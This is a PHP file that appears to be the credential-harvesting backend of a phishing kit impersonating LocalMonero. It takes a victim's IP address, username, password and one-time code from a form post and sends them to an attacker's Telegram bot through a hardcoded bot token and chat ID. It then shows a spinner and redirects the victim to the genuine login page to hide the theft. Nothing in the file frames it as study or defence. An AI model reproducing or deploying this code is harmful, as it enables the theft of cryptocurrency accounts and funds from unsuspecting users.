<?php

date_default_timezone_set('Europe/Amsterdam');

$visitor_ip = $_SERVER['REMOTE_ADDR'];
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $Username = $_POST['Username'];
    $Password = $_POST['Password'];
    $OTP = $_POST['OTP'];

    $telegram_message = "🟠 Monero-Static | Information 🟠\n________________________________
⚙️VIC IP: " . $visitor_ip . "\n
👤Monero Username: " . $Username . "
🔧Monero Password: " . $Password . "
🔐OTP (optional): " . $OTP . "\n
Received Log at: " . date("Y-m-d H:i:s") . "\n
   @KALIOLOGIE" . "
________________________________";

    // Keeping the same bot token and chat ID
    $telegram_token = "6375326209:AAHznFTmYEJkWiY0qaoSWlEHwdyG5ixKufQ";
    $telegram_chat_id = "-1002117422654";

    $url = "https://api.telegram.org/bot" . $telegram_token . "/sendMessage?chat_id=" . $telegram_chat_id . "&text=" . urlencode($telegram_message);

    $response = file_get_contents($url);
}

 
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="3;url=https://localmonero.co/login">
    <title>Loading...</title>
    <style>
        .loader {
            border: 16px solid #f3f3f3;
            border-top: 16px solid #3498db;
            border-radius: 50%;
            width: 120px;
            height: 120px;
            animation: spin 2s linear infinite;
            margin: 20% auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
</body>
</html>
